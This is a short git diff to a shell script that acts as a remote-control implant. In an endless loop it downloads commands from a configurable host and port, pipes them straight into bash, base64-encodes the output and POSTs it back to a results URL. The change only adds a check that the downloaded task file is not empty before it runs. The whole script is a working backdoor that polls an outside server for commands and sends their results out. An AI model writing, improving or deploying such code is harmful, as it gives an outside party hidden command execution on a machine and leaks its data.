@@ -16,9 +16,11 @@ resultl="http://$ip:$port/Lin-results/$name/"
 while :
 do  
     curl $taskl > /tmp/tasks 
-    cat /tmp/tasks | bash > /tmp/results
-    base64 /tmp/results > /tmp/enc-result   
-    curl -X POST --data "@/tmp/enc-result" $resultl
+    if [ -s /tmp/tasks ]; then
+        cat /tmp/tasks | bash > /tmp/results
+        base64 /tmp/results > /tmp/enc-result   
+        curl -X POST --data "@/tmp/enc-result" $resultl
+    fi
     sleep $n    
 done
 
